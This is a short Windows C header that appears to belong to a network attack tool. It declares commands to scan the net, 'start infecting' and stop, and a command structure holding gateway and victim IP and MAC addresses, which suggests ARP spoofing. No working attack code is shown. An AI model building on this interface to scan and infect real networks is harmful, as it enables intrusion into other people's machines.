#pragma once

#include <Windows.h>

#pragma pack(1)

#define ACTS_NUM 2 //scan, infect

enum ACTS
{
	SCAN, //start scanning the net
	INFECT, //start infecting
	STOP_I, //stop infecting
	STOP_S, //stop scanning
	STOP_A //stop all
};

typedef struct command
{
	BYTE act;
	ULONG gateway_ip;
	ULONG victim_ip;
	BYTE gateway_mac[6];
	BYTE victim_mac[6];
	//etc...
} *pCommand;

void add_command(pCommand command);

DWORD WINAPI execute_commands(pCommand command);
